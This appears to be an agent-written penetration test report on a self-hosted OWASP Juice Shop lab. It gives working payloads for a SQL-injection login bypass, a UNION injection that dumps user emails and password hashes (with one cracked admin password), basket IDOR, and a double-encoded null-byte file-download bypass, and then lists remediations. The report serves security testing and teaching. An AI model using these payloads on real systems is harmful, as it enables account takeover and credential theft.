# Juice Shop (v20.3.0) — First-Contact Pentest Report

Target: `http://host.docker.internal:3000` (OWASP Juice Shop 20.3.0, self-hosted lab)
Date: 2026-10-17 · Scope: single host, no DoS / no destructive tests

## Recon summary

| Item | Result |
|---|---|
| `GET /rest/admin/application-version` | `{"version":"20.3.0"}` (unauthenticated version leak) |
| `GET /robots.txt` | `Disallow: /ftp` |
| `GET /ftp/` | directory listing: `package.json.bak`, `coupons_2013.md.bak`, `incident-support.kdbx`, `suspicious_errors.yml`, `encrypt.pyc`, `acquisitions.md`, … |
| `main.js` bundle (1.2 MB) | API map: `/rest/user/login`, `/rest/products/search`, `/rest/basket/<id>`, `/api/Users`, `/rest/user/reset-password`, `/rest/memories`, `/rest/chat`, … |
| Tech | Node/Express + Sequelize + SQLite, Angular SPA, RS256 JWT |
| Notable header | `Access-Control-Allow-Origin: *`, `X-Recruiting: /#/jobs` |

## Findings (4 confirmed, 3+ distinct classes)

### 1. SQL Injection → Authentication Bypass / admin takeover
* **Where:** `POST /rest/user/login`
* **Why:** email/password are concatenated into `SELECT * FROM Users WHERE email='<e>' AND password='<hash>'`; no parameterisation.
* **Payload:** `{"email":"admin@juice-sh.op'--","password":"x"}` — the `--` comments out the password predicate, the first row (id 1, admin) is returned and a valid **admin JWT** is signed.
* **Proof:** admin token; `GET /api/Users` (admin-only) returns all 24 accounts.
* **PoC:** `poc1_sqli_login_bypass.py`

### 2. UNION-based SQL Injection → full user-table exfiltration
* **Where:** `GET /rest/products/search?q=`
* **Why:** `q` is interpolated into `... WHERE ((name LIKE '%q%' OR description LIKE '%q%')) ...`; SQLite errors are reflected to the client.
* **Recon:** `q=apple'` → `SQLITE_ERROR ... syntax error`; `q=apple'))--` → clean JSON; 10 result columns.
* **Payload:** `')) UNION SELECT id,email,password,4,5,6,7,8,9,10 FROM Users--`
* **Result:** 24 email + **unsalted MD5** password hashes; `admin@juice-sh.op : admin123` cracked and re-used to log in.
* **PoC:** `poc2_sqli_union_dump.py` · loot: `loot/users_credentials.json`

### 3. IDOR / Broken Object Level Authorization on baskets (horizontal privesc)
* **Where:** `GET /rest/basket/<id>`
* **Why:** only "is authenticated" is checked, never "is my basket"; ids are sequential.
* **Proof:** a freshly self-registered `role=customer` session read the admin's basket (`id=1`, `UserId=1`) and baskets 1–7 belonging to other users, including product names, quantities and prices.
* **PoC:** `poc3_idor_basket.py`
* **Note:** write attempts via `POST /api/BasketItems` with a foreign `BasketId` were rejected (`401 Invalid BasketId`), so the confirmed impact is read-only disclosure.

### 4. Improper file-download restriction (extension filter bypass → forbidden file disclosure)
* **Where:** `GET /ftp/<file>`
* **Why:** the filter string-matches the URL suffix against `.md|.pdf` but the name is URL-decoded afterwards. A double-encoded NUL (`%2500` → `%00`) truncates the path at OS level while the string still ends in `.md`.
* **Bypass:** `GET /ftp/package.json.bak%2500.md` → `200` (direct request → `403`).
* **Result:** 5 protected files downloaded → `package.json.bak` (dependency versions), `coupons_2013.md.bak` (coupon codes), `incident-support.kdbx`, `suspicious_errors.yml`, `encrypt.pyc`.
* **PoC:** `poc4_ftp_bypass.py` · loot: `loot/`

## PoC files

| File | Finding |
|---|---|
| `poc1_sqli_login_bypass.py` | SQLi login bypass → admin JWT |
| `poc2_sqli_union_dump.py` | UNION SQLi → user table + MD5 crack |
| `poc3_idor_basket.py` | IDOR on `/rest/basket/<id>` |
| `poc4_ftp_bypass.py` | `/ftp/` extension-filter bypass |

Run with `python3 pocN_*.py` (needs `requests`; target host hardcoded to `host.docker.internal:3000`).

## Remediation notes

1. Parameterised queries / ORM bindings for login and product search; stop returning raw DB errors.
2. Salt + slow hash (bcrypt/argon2) for passwords instead of unsalted MD5.
3. Server-side ownership check (`basket.UserId === token.bid`) on every basket route.
4. Resolve+canonicalise the path first, then whitelist-validate the *final* extension; reject NUL bytes outright; move backups/KeePass vaults out of the web root.

---
*Note:* pre-existing artifacts from an earlier session (`/workspace/poc2_admin.token`, `/workspace/pocs/`) were found in the workspace and ignored — all findings above were re-verified independently.
